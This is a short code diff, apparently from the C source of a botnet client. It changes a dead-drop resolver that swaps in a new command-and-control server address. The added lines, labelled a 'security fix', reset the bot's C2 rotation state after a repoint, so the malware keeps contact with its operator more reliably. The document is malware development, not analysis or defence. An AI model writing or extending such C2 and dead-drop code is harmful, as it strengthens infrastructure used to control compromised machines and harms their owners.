@@ -124,5 +124,11 @@ int deaddrop_resolve(notnet_bot_t *bot) {
 
     log_info("Dead-drop: applied verified C2 override %s:%u (from %s)",
              bot->c2_http.server, bot->c2_http.port, bot->dead_drop_url);
+
+    /* SECURITY FIX (#93): a verified repoint resets the rotation
+     * failure streak and returns to the primary endpoint, so the
+     * fresh drop gets a fair chance before any static c2_backup_<n>
+     * rotation applies. */
+    c2_rotation_note_repoint(bot);
     return 0;
 }
